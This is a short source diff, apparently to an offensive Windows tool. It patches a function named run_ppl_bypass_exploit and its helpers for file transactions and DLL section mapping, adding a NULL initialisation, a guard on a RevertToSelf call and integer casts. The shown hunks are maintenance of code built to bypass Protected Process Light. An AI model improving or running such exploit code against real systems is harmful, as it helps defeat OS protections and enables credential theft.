@@ -63,11 +63,11 @@ BOOL run_ppl_bypass_exploit(
     HANDLE hNewProcess = NULL;
     SECURITY_QUALITY_OF_SERVICE Qos = { 0 };
     OBJECT_ATTRIBUTES TokenObjectAttributes = { 0 };
+    RevertToSelf_t RevertToSelf = NULL;
 
     if (!check_ppl_requirements())
         goto end;
 
-    RevertToSelf_t RevertToSelf;
     RevertToSelf = (RevertToSelf_t)(ULONG_PTR)get_function_address(
         get_library_address(ADVAPI32_DLL, TRUE),
         RevertToSelf_SW2_HASH,
@@ -546,7 +546,7 @@ BOOL run_ppl_bypass_exploit(
     bReturnValue = TRUE;
 
 end:
-    if (bImpersonationActive)
+    if (bImpersonationActive && RevertToSelf)
         RevertToSelf(); // If impersonation was active, drop it first
     if (hNewProcessToken)
         NtClose(hNewProcessToken);
@@ -777,7 +777,7 @@ BOOL find_file_for_transaction(
         wcsncat(wszFilePath, L"\\", MAX_PATH);
         wcsncat(wszFilePath, wfd.cFileName, MAX_PATH);
         name.Buffer  = wszFilePath;
-        name.Length  = wcsnlen(name.Buffer, MAX_PATH);;
+        name.Length  = (USHORT)wcsnlen(name.Buffer, MAX_PATH);;
         name.Length *= 2;
         name.MaximumLength = name.Length + 2;
         InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);
@@ -990,7 +990,7 @@ BOOL map_dll(
         goto end;
 
     sectionName.Buffer  = pwszSectionName;
-    sectionName.Length  = wcsnlen(sectionName.Buffer, MAX_PATH);;
+    sectionName.Length  = (USHORT)wcsnlen(sectionName.Buffer, MAX_PATH);;
     sectionName.Length *= 2;
     sectionName.MaximumLength = sectionName.Length + 2;
     InitializeObjectAttributes(&oa, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);
